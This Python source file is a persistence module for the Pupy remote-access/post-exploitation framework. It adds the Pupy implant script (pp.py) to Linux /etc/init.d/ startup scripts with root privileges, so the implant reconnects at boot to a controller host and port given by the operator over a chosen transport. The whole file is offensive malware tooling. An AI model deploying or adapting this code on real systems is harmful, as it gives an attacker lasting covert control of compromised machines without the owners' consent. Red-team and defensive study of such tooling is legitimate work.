#!/usr/bin/env python
import os
from pupylib.PupyModule import *

__class_name__="SetPersistence"
def print_callback(data):
    sys.stdout.write(data)
    sys.stdout.flush()

class SetPersistence(PupyModule):
    """Add your pp.py file to /etc/init.d/ scripts
NOTE: the pp.py script needs to be running with root privileges in order to modify the init scripts."""

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="Linux Persistance Module", description=self.__doc__)
        self.arg_parser.add_argument('--path', help='path to your pp.py file on the system, ex: /etc/pp.py')
        self.arg_parser.add_argument('--mode', help='mode to be passes on the script, ex: simple')
        self.arg_parser.add_argument('--transport', help='transport argument to be passed on the script, ex: tcp_ssl')
        self.arg_parser.add_argument('--host', help='host argument to be passed on the script, ex: 192.168.0.100:4444')
        
    def run(self, args):
        self.client.load_package("linux_pers")
        self.client.conn.modules['linux_pers'].add(args.path, args.mode, args.transport, args.host)
        self.success("Module executed successfully.")
